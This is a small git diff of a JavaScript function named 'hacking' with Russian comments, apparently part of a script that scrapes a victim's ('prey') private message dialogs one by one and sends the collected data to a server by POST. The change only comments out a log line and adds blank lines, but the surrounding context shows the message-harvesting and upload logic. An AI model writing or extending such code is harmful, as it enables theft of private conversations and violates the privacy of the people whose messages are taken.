@@ -388,7 +388,7 @@ async function hacking() {
         // добавляем сообщения с этой страницы в объект по имени
         dialogsData[preyId][friendName] = getMessages();
 
-        console.log(dialogsData);
+        // console.log(dialogsData);
 
         i++; // увеличиваем i, чтобы перейти к след. диалогу
     }, 2000);
@@ -405,7 +405,9 @@ async function hacking() {
                 body: formData,
             }
         );
+
         console.log('data is missed');
+
         dialogsData = {
             [preyId]: {}
         };
